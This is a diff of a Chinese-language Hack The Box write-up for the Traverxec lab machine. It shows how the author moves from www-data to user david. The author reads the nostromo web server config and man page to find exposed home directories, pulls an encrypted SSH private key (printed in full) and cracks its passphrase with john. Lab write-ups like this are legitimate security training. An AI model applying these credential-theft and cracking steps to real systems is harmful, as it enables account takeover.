@@ -113,18 +113,167 @@ Session completed
 
 可是用这个密码不能切换到david，也不能ssh登录。
 
+这里我卡了非常久，一直不能提权到david，上HTB论坛看别人的hint，提到需要认真查看服务文档和config文件
 
 
-passwd file: /etc/pam.d/passwd                                                                                                                                       
-passwd file: /etc/passwd
-passwd file: /usr/share/bash-completion/completions/passwd
-passwd file: /usr/share/lintian/overrides/passwd
-passwd file: /var/nostromo/conf/.htpasswd
+查看```/var/nostromo/conf/nhttpd.conf```文件
+
+```
+# MAIN [MANDATORY]
+
+servername              traverxec.htb
+serverlisten            *
+serveradmin             david@traverxec.htb
+serverroot              /var/nostromo
+servermimes             conf/mimes
+docroot                 /var/nostromo/htdocs
+docindex                index.html
+
+# LOGS [OPTIONAL]
+
+logpid                  logs/nhttpd.pid
+
+# SETUID [RECOMMENDED]
+
+user                    www-data
+
+# BASIC AUTHENTICATION [OPTIONAL]
+
+htaccess                .htaccess
+htpasswd                /var/nostromo/conf/.htpasswd
+
+# ALIASES [OPTIONAL]
+
+/icons                  /var/nostromo/icons
+
+# HOMEDIRS [OPTIONAL]
+
+homedirs                /home
+homedirs_public         public_www
 
 
-The password hash is from the {SSHA} to 'structural'                                                                                                                 
-drwxr-xr-x 2 root root 4096 Oct 25  2019 /etc/ldap
+```
 
-ssh -v david@10.10.10.165 id
+注意这个服务的admin是```david@traverxec.htb```，另外留意这两段
+```
+homedirs                /home
+homedirs_public         public_www
+```
 
-htpasswd /var/nostromo/conf/.htpasswd david
+使用```man nhttpd```命令，留意这段
+```
+HOMEDIRS
+     To serve the home directories of your users via HTTP, enable the homedirs
+     option by defining the path in where the home directories are stored,
+     normally /home.  To access a users home directory enter a ~ in the URL
+     followed by the home directory name like in this example:
+
+           http://www.nazgul.ch/~hacki/
+
+     The content of the home directory is handled exactly the same way as a
+     directory in your document root.  If some users don't want that their
+     home directory can be accessed via HTTP, they shall remove the world
+     readable flag on their home directory and a caller will receive a 403
+     Forbidden response.  Also, if basic authentication is enabled, a user can
+     create an .htaccess file in his home directory and a caller will need to
+     authenticate.
+
+     You can restrict the access within the home directories to a single sub
+     directory by defining it via the homedirs_public option.
+```
+
+在网页上使用```~[用户名]```可以访问用户的home目录
+
+这个靶机是```http://10.10.10.165/~david```
+
+文档同时说明，如果不想别人通过http访问到自己的home目录，可以指定```public_www```替代
+
+也就是说上面网页其实访问的就是david下的```public_www```目录
+
+我们查看```public_www```内容
+
+```
+www-data@traverxec:/var/nostromo/conf$ ls -alh /home/david/public_www
+ls -alh /home/david/public_www
+total 16K
+drwxr-xr-x 3 david david 4.0K Oct 25  2019 .
+drwx--x--x 5 david david 4.0K Oct 25  2019 ..
+-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
+drwxr-xr-x 2 david david 4.0K Oct 25  2019 protected-file-area
+
+```
+
+在```protected-file-area```下找到david的ssh秘钥
+```
+┌──(root💀kali)-[~/Downloads/home/david/.ssh]
+└─# cat id_rsa                                                           
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F
+
+seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
+tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
+KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
+RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
+HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
+Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
+dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
+6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
+xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
+Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
+i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
+fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
+bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
+uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
+Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
+9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
+rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
+4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
+/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
+JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
+XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
+hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
+SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
+j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
+VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
+-----END RSA PRIVATE KEY-----
+
+```
+
+
+john破解
+```
+┌──(root💀kali)-[~/htb/Traverxec]
+└─# /usr/share/john/ssh2john.py id_rsa >rsacrack
+                                                                                            
+┌──(root💀kali)-[~/htb/Traverxec]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt rsacrack 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hunter           (id_rsa)
+Warning: Only 2 candidates left, minimum 4 needed for performance.
+1g 0:00:00:07 DONE (2021-12-28 06:02) 0.1321g/s 1894Kp/s 1894Kc/s 1894KC/sa6_123..*7¡Vamos!
+Session completed
+
+```
+
+登录到```david```账号
+```
+┌──(root💀kali)-[~/htb/Traverxec]
+└─# ssh -i id_rsa david@10.10.10.165
+The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established.
+RSA key fingerprint is SHA256:GlGTwru98ALf7QPJpV8VHV6L2FOwREy6tz2O2W/9JM0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.165' (RSA) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
+david@traverxec:~$ id
+uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+
+```
